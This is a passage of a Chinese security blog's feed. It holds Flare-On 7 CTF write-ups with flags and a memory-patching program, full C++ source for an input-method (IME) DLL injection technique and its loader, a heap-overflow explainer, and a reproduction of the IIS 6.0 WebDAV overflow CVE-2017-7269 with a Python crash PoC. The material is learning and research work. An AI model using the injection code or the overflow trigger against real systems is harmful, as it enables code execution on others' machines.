        &lt;h2 id=&quot;调试器基础0x3-反汇编引擎使用&quot;&gt;&lt;a href=&quot;#调试器基础0x3-反汇编引擎使用&quot; class=&quot;headerlink&quot; title=&quot;调试器基础0x3(反汇编引擎使用)&quot;&gt;&lt;/a&gt;调试器基础0x3(反汇编引擎使用)&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="调试器" scheme="http://yeanhoo.gitee.io/tags/%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Flare_On_7</title>
    <link href="http://yeanhoo.gitee.io/2021/03/08/Flare_On_7/"/>
    <id>http://yeanhoo.gitee.io/2021/03/08/Flare_On_7/</id>
    <published>2021-03-08T13:39:02.384Z</published>
    <updated>2021-03-08T13:45:54.511Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Flare-On-7"><a href="#Flare-On-7" class="headerlink" title="Flare_On_7"></a>Flare_On_7</h2><p>第七届年度<code>Flare-On</code>挑战赛</p><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><hr><p><code>password</code>验证逻辑,<code>key=ghost</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">password_check</span><span class="params">(input)</span>:</span></span><br><span class="line">    altered_key = <span class="string">'hiptu'</span></span><br><span class="line">    key = <span class="string">''</span>.join([chr(ord(x) - <span class="number">1</span>) <span class="keyword">for</span> x <span class="keyword">in</span> altered_key])</span><br><span class="line">    <span class="keyword">return</span> input == key</span><br></pre></td></tr></table></figure><p>游戏逻辑,需要<code>current_coins &gt;target_amount - 2**20</code>，修改代码逻辑，给<code>current_coins</code>赋值即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">        target_amount = (<span class="number">2</span>**<span class="number">36</span>) + (<span class="number">2</span>**<span class="number">35</span>)</span><br><span class="line">        <span class="comment">#current_coins = (2**36) + (2**35) +1</span></span><br><span class="line">        <span class="keyword">if</span> current_coins &gt; (target_amount - <span class="number">2</span>**<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">while</span> current_coins &gt;= (target_amount + <span class="number">2</span>**<span class="number">20</span>):</span><br><span class="line">                current_coins -= <span class="number">2</span>**<span class="number">20</span></span><br><span class="line">            victory_screen(int(current_coins / <span class="number">10</span>**<span class="number">8</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p><code>flag：idle_with_kitty@flare-on.com</code></p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><hr><p>尝试运行程序时提示无效的win32程序，使用<code>010 Editer</code>发现<code>.rsrc</code>节区不全，使用全0字节补齐后程序仍无法正常运行</p><p>使用工具DIE查看程序加壳信息为<code>UPX(3.94)[NRV,best]</code></p><p>使用<code>UPX3.94</code>加壳器尝试解包软件，解包后仍无法运行</p><p>使用<code>SxsTrace</code>工具，提示为指令清单错误</p><p>使用<code>CFF Explorer</code>删除程序清单</p><p>通过<code>CFF Explorer</code>查看导入表发现缺失模块名称，根据API猜测填写模块名称，成功运行</p><p><code>flag:Congrats! Your key is: C0rruptGarbag3@flare-on.com</code></p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><hr><p>根据提示信息调试<code>mydude.exe</code>,通过字符串找到<code>High Score</code>并下断，发现cmp比较值为0x128,绕过判断后游戏提示winner但是并未出现flag</p><p>ida转到<code>High Score</code>地址，通过<code>Cheat Engine</code>对附近变量<code>score</code>、<code>high_score</code>进行修改，无效果</p><p>ida查看交叉引用找到对<code>score</code>赋值的函数，使用CE尝试修改判断条件，让程序一定进入循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( *(_BYTE *)(v3 + 248) &#x3D;&#x3D; *(_BYTE *)(v24 + 248) )</span><br><span class="line">           &#123;</span><br><span class="line">             v16 &#x3D; score__h34o6jaI3AO6iOQqLKaqhw + 1;</span><br><span class="line">             if ( __OFADD__(1, score__h34o6jaI3AO6iOQqLKaqhw) )</span><br><span class="line">               raiseOverflow(v22);</span><br><span class="line">             *(_BYTE *)(v3 + 24) &#x3D; 1;</span><br><span class="line">             score__h34o6jaI3AO6iOQqLKaqhw &#x3D; v16;</span><br></pre></td></tr></table></figure><p>然后按住下键不松手，即可通关</p><p><code>flag:1t_i5_wEdn3sd4y_mY_Dud3s@flare-on.com</code></p><p>通过代码实现修改</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD pid = <span class="number">2604</span>;</span><br><span class="line">HANDLE hand = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, pid);<span class="comment">//打开进程句柄</span></span><br><span class="line"><span class="keyword">if</span> (!hand)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">DWORD oldflag;</span><br><span class="line">VirtualProtectEx(hand,(LPVOID)<span class="number">0x432358</span>,<span class="number">0x1000</span>, PAGE_EXECUTE_READWRITE,&amp;oldflag);</span><br><span class="line">BYTE  code[<span class="number">6</span>] = &#123;<span class="number">0xE9</span>,<span class="number">0x04</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0xFF</span>,<span class="number">0x90</span>&#125;;</span><br><span class="line">SIZE_T <span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">WriteProcessMemory(hand, (LPVOID)<span class="number">0x432358</span>, code, <span class="number">6</span>, &amp;<span class="built_in">size</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h3><hr><p>office宏代码自动执行<code>folderol()</code>函数，宏代码无法正常运行</p><p>新建xlsx，边调边修宏代码逻辑</p><p>待更新。。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Flare-On-7&quot;&gt;&lt;a href=&quot;#Flare-On-7&quot; class=&quot;headerlink&quot; title=&quot;Flare_On_7&quot;&gt;&lt;/a&gt;Flare_On_7&lt;/h2&gt;&lt;p&gt;第七届年度&lt;code&gt;Flare-On&lt;/code&gt;挑战赛&lt;/p&gt;
&lt;h3 
      
    
    </summary>
    
    
      <category term="技巧" scheme="http://yeanhoo.gitee.io/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="Flare_On_7" scheme="http://yeanhoo.gitee.io/tags/Flare-On-7/"/>
    
      <category term="CTF" scheme="http://yeanhoo.gitee.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>输入法注入</title>
    <link href="http://yeanhoo.gitee.io/2021/03/07/%E8%BE%93%E5%85%A5%E6%B3%95%E6%B3%A8%E5%85%A5/"/>
    <id>http://yeanhoo.gitee.io/2021/03/07/%E8%BE%93%E5%85%A5%E6%B3%95%E6%B3%A8%E5%85%A5/</id>
    <published>2021-03-07T13:06:31.089Z</published>
    <updated>2021-03-08T13:44:59.754Z</updated>
    
    <content type="html"><![CDATA[<h2 id="输入法注入"><a href="#输入法注入" class="headerlink" title="输入法注入"></a>输入法注入</h2><p>系统在切换进程时会自动将输入法ime文件加载到进程内存，因此可以利用这一点实现自己的ime文件</p><p>不需要编写完整的输入法，只需要完成<code>ImeInquire</code>函数即可</p><p><strong>输入法代码</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;imm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;immdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"imm32.lib"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyFun</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule,DWORD reason_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(reason_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line">WNDCLASSEXA wndClass = &#123; <span class="number">0</span> &#125;;<span class="comment">//输入法必须注册窗口类</span></span><br><span class="line">wndClass.lpfnWndProc = DefWindowProc;</span><br><span class="line">wndClass.lpszClassName =  <span class="string">"yeanhoo"</span>;</span><br><span class="line">wndClass.lpszMenuName = <span class="string">"yean"</span>;</span><br><span class="line">wndClass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEXA);</span><br><span class="line">RegisterClassExA(&amp;wndClass);</span><br><span class="line">MyFun();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyFun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>,<span class="string">"yeanhoo"</span>,<span class="string">"run"</span>,MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">ImeInquire</span><span class="params">(LPIMEINFO lpImeInfo,LPTSTR lpszUIClass,LPCTSTR lpszOption)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//这个函数会在DlllMain之后被win32调用，用来了解输入法特性</span></span><br><span class="line">lpImeInfo-&gt;dwPrivateDataSize = <span class="number">0</span> ;</span><br><span class="line">lpImeInfo-&gt;fdwProperty = IME_PROP_KBD_CHAR_FIRST |IME_PROP_UNICODE |IME_PROP_IGNORE_UPKEYS|IME_PROP_SPECIAL_UI;</span><br><span class="line">lpImeInfo-&gt;fdwConversionCaps = IME_CMODE_NATIVE |IME_CMODE_NOCONVERSION;</span><br><span class="line">lpImeInfo-&gt;fdwSentenceCaps = <span class="number">0</span> ;</span><br><span class="line">lpImeInfo-&gt;fdwUICaps = UI_CAP_ROT90;</span><br><span class="line">lpImeInfo-&gt;fdwSCSCaps = SCS_CAP_COMPSTR |SCS_CAP_MAKEREAD;</span><br><span class="line">lpImeInfo-&gt;fdwSelectCaps = (DWORD)<span class="number">0</span>;</span><br><span class="line">lstrcpy(lpszUIClass,<span class="string">"yeanhoo"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>加载器代码</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;imm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"imm32.lib"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PVOID m_retV;</span><br><span class="line">SystemParametersInfoA(SPI_GETDEFAULTINPUTLANG,<span class="number">0</span>,&amp;m_retV,<span class="number">0</span>);<span class="comment">//检查输入环境</span></span><br><span class="line">HKL m_hImeFile = ImmInstallIMEA(<span class="string">"yeanhoo.ime"</span>,<span class="string">"yean"</span>);</span><br><span class="line">SystemParametersInfo(SPI_GETDEFAULTINPUTLANG,<span class="number">0</span>,&amp;m_hImeFile,SPIF_SENDWININICHANGE);<span class="comment">//设置为默认输入法</span></span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><p>​    编辑输入法的项目为dll项目</p></li><li><p>​    输入法需要添加资源文件包括输入法图标和（如下图）</p></li><li><p><code>dllmain()</code> 和<code>ImeInquire()</code>是必须存在的</p></li><li><p>编译好后修改dll命名为ime文件并拷贝到<code>system32</code>目录</p></li><li><p>加载器为控制台项目</p></li><li><p>安装成功后切换输入法触发弹框</p></li></ul><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210111145912797.png" alt></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210111150546703.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;输入法注入&quot;&gt;&lt;a href=&quot;#输入法注入&quot; class=&quot;headerlink&quot; title=&quot;输入法注入&quot;&gt;&lt;/a&gt;输入法注入&lt;/h2&gt;&lt;p&gt;系统在切换进程时会自动将输入法ime文件加载到进程内存，因此可以利用这一点实现自己的ime文件&lt;/p&gt;
&lt;p&gt;不需要
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="进程注入" scheme="http://yeanhoo.gitee.io/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    
      <category term="代码注入" scheme="http://yeanhoo.gitee.io/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>二进制漏洞——堆溢出复现(DWORD SHOOT)</title>
    <link href="http://yeanhoo.gitee.io/2021/03/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0(DWORD%20SHOOT)/"/>
    <id>http://yeanhoo.gitee.io/2021/03/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E5%A0%86%E6%BA%A2%E5%87%BA%E5%A4%8D%E7%8E%B0(DWORD%20SHOOT)/</id>
    <published>2021-03-07T13:03:14.241Z</published>
    <updated>2021-03-08T13:45:36.704Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二进制漏洞——堆溢出学习-DWORD-SHOOT"><a href="#二进制漏洞——堆溢出学习-DWORD-SHOOT" class="headerlink" title="二进制漏洞——堆溢出学习(DWORD SHOOT)"></a>二进制漏洞——堆溢出学习(DWORD SHOOT)</h2><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><ul><li>空闲双向链表（空表）<ul><li>空闲堆块的块首中包含一对重要的指针，这对指针将空闲堆块组成双向链表。空表总共128条，按堆块大小区分。<strong>这里需要注意空表第一项（零号空表）是将所有大于等于1024字节 的堆块链接起来</strong>。</li></ul></li></ul><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/heapoverflow1.png" alt></p><ul><li><p>快速单向链表（快表）</p><ul><li>快速单向链表也是128条，组织结构与空表类似，是Windows用来加速堆块分配而采用的分配方式，这类单向链表其中的空闲块块首会被设置为占用态，不会发生堆块合并。且每条单向链表最多4个节点。</li></ul></li></ul><h3 id="使用堆"><a href="#使用堆" class="headerlink" title="使用堆"></a>使用堆</h3><ul><li><p>堆块分配</p><ul><li>堆块分配大致分为三类：快表分配、普通空表分配、零号空表分配。</li></ul></li><li><p>堆块释放</p><ul><li>将堆块状态改为空闲、链入相应的堆表。所有释放块都链入堆表的末尾，分配的时候也是先从末尾拿。</li></ul></li><li><p>堆块合并</p><ul><li>经过反复的申请与释放操作，产生了很多内存碎片，为了更有效的利用内存，堆管理系统进行堆块合并操作。当发现两块空闲堆块彼此相邻时，就会进行堆块合并操作。包括将两个块从空表中卸下、合并堆块、调整合并后块首信息、重新装入空表。</li></ul></li></ul><h3 id="DWORD-SHOOT概念"><a href="#DWORD-SHOOT概念" class="headerlink" title="DWORD SHOOT概念"></a>DWORD SHOOT概念</h3><p>下图是正常情况下将堆块从空表中卸载的流程</p><p>假设有三个相邻双向链表节点分别名为A、B、C，卸载的流程就是将A的前节点指向C，且把C的后节点指向A。这样B节点就被卸载下来。</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/heapfree.png" alt></p><p><code>DWORD SHOOT</code>的实现就是在这个过程中构造溢出实现任意地址写四个字节恶意数据,</p><p>即将B的后节点指向任意地址，将B的前节点改为四字节恶意数据。在拆卸堆块时实现向任意地址写入四字节的恶意数据</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/DWshoot.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;二进制漏洞——堆溢出学习-DWORD-SHOOT&quot;&gt;&lt;a href=&quot;#二进制漏洞——堆溢出学习-DWORD-SHOOT&quot; class=&quot;headerlink&quot; title=&quot;二进制漏洞——堆溢出学习(DWORD SHOOT)&quot;&gt;&lt;/a&gt;二进制漏洞——堆溢出学习(
      
    
    </summary>
    
    
      <category term="C\C++" scheme="http://yeanhoo.gitee.io/categories/C-C/"/>
    
    
      <category term="二进制漏洞" scheme="http://yeanhoo.gitee.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="堆溢出" scheme="http://yeanhoo.gitee.io/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-7269复现分析</title>
    <link href="http://yeanhoo.gitee.io/2021/03/07/CVE-2017-7269%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>http://yeanhoo.gitee.io/2021/03/07/CVE-2017-7269%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</id>
    <published>2021-03-07T13:03:13.211Z</published>
    <updated>2021-03-08T13:46:09.607Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2017-7296复现分析"><a href="#CVE-2017-7296复现分析" class="headerlink" title="CVE-2017-7296复现分析"></a>CVE-2017-7296复现分析</h2><h3 id="Microsoft-Internet-Information-Services-缓冲区错误漏洞"><a href="#Microsoft-Internet-Information-Services-缓冲区错误漏洞" class="headerlink" title="Microsoft Internet Information Services 缓冲区错误漏洞"></a>Microsoft Internet Information Services 缓冲区错误漏洞</h3><ul><li>CNNVD编号：CNNVD-201703-1074</li><li>危害等级：  超危 </li><li>CVE编号： <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269" target="_blank" rel="noopener">CVE-2017-7269</a></li><li>漏洞类型： 缓冲区错误</li><li>发布时间： <a href="http://www.cnnvd.org.cn/web/vulnerability/querylist.tag?qstartdateXq=2017-03-27" target="_blank" rel="noopener">2017-03-27</a></li><li>威胁类型： 远程</li><li>更新时间： <a href="http://www.cnnvd.org.cn/web/vulnerability/querylist.tag?cvCnnvdUpdatedateXq=2019-07-08" target="_blank" rel="noopener">2019-07-08</a></li><li>厂    商： <a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201703-1074#" target="_blank" rel="noopener">microsoft</a></li></ul><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li><p><code>Internet Information Services（IIS）</code>是一套运行于<code>Microsoft Windows</code>中的互联网基本服务。</p></li><li><p><code>Microsoft Windows Server 2003 R2</code>中的<code>IIS 6.0</code>版本中的<code>WebDAV</code>服务的<code>ScStoragePathFromUrl</code>函数存在缓冲区溢出漏洞(堆溢出和栈溢出都包括)。远程攻击者可通过发送特制的<code>PROPFIND</code>请求利用该漏洞执行任意代码。</p></li><li><p><code>WEB</code>分布式创作和版本控制<code>WebDAV</code>是超文本传输协议<code>HTTP</code>的扩展，可促进用户之间在编辑和管理存储在万维网服务器上的文档和文件之间的协作。</p></li><li><p><code>ROPFIND</code>用于从<code>WEB</code>资源检索以XML存储的属性。它也被重载，以允许它检索远程系统的集合结构（也称为目录层次结构）。</p></li></ul><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><hr><ul><li><code>Windows Server 2003 R2, Enterprise Edition with SP2</code>目标机<ul><li>开始菜单—&gt;管理工具—&gt;管理您的服务器—&gt;添加或删除角色(应用服务器(IIS,ASP,NET))</li><li>开始菜单—&gt;管理工具—&gt;Internet 信息服务(IIS)管理器—&gt;Web服务设置—&gt;WebDAV(允许)</li></ul></li><li><code>Windows 7 Enterprise with Service Pack 1 (x86)</code>攻击机<ul><li>用来执行EXP实现RCE漏洞利用</li></ul></li></ul><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_1.png" alt></p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><hr><h4 id="定位溢出点"><a href="#定位溢出点" class="headerlink" title="定位溢出点"></a>定位溢出点</h4><p>随便建立一个默认的网站<code>index</code>页面，测试使用<a href="https://github.com/edwardz246003/IIS_exploit" target="_blank" rel="noopener">EXP</a>,可以成功触发由<code>w3wp.exe</code>创建<code>calc.exe</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2017_7269_2.gif" alt></p><p>微软给出的<code>WebDAV PROPFIND</code>方法的请求示例如下，可以通过<code>socket</code>的方式按照下述方式构造数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PROPFIND /public/docs/myFile.doc HTTP/1.1</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: XXX</span><br><span class="line">Depth: 0</span><br><span class="line">Translate: f</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a:propfind</span> <span class="attr">xmlns:a</span>=<span class="string">"DAV:"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a:prop</span>&gt;</span><span class="tag">&lt;<span class="name">a:getcontenttype</span>/&gt;</span><span class="tag">&lt;/<span class="name">a:prop</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a:prop</span>&gt;</span><span class="tag">&lt;<span class="name">a:getcontentlength</span>/&gt;</span><span class="tag">&lt;/<span class="name">a:prop</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a:propfind</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于没有补丁程序且栈层严重损坏根据栈回溯定位溢出点比较麻烦，尝试开启<code>PageHeap</code>机制，启用<code>PageHeap</code>后，堆内存分配将会在分配内存后面紧跟了一个4k的<code>PAGE_NOACCESS</code>属性的页面,这种情况下，尝试读写执行所分配内存其后的地址将会导致访问冲突，因此启用<code>PageHeap</code>的好处是能在一定程度上检查内存越界。和<code>PAGE_GUARD</code>有点相似，任何尝试访问<code>PAGE_GUARD</code>保护页面的尝试都会导致系统引发<code>STATUS_GUARD_PAGE_VIOLATION</code>异常并关闭保护页面状态。</p><p>下载<a href="http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools/dbg_x86.msi" target="_blank" rel="noopener">旧版本<code>windbg</code>进行本地调试</a>，<code>windbg</code>目录下执行如下命令开启<code>PageHeap</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gflags.exe /p /enable C:\WINDOWS\system32\inetsrv\w3wp.exe</span><br></pre></td></tr></table></figure><p>修改<code>POC</code>代码，使其发送超长字符串导致溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((<span class="string">'192.168.1.2'</span>,<span class="number">80</span>))</span><br><span class="line">pay=<span class="string">'PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'</span></span><br><span class="line">pay+=<span class="string">'If: &lt;http://localhost/aaaaaaa'</span></span><br><span class="line">pay+=<span class="string">'A'</span>*<span class="number">10240</span></span><br><span class="line">pay+=<span class="string">'&gt;\r\n\r\n'</span></span><br><span class="line">sock.send(pay)</span><br></pre></td></tr></table></figure><p>使用<code>windbg</code>附加到<code>w3wp.exe</code>进程,在攻击机执行<code>POC</code>触发<code>PAGE_NOACCESS</code>,<code>windbg</code>自动断下，回显信息如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; .reload</span><br><span class="line">Reloading current modules</span><br><span class="line">.................................................</span><br><span class="line">[...]</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 673e0000 6741e000   \\?\c:\windows\system32\inetsrv\httpext.dll</span><br><span class="line">ModLoad: 5bac0000 5bac6000   C:\WINDOWS\system32\staxmem.dll</span><br><span class="line">ModLoad: 6da00000 6da06000   C:\WINDOWS\system32\inetsrv\davcprox.dll</span><br><span class="line">(fe4.180): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00005014 ebx=00002809 ecx=0000026c edx=01e8c978 esi=020b6f14 edi=01e91000</span><br><span class="line">eip=673f6fdb esp=0133f330 ebp=0133f798 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  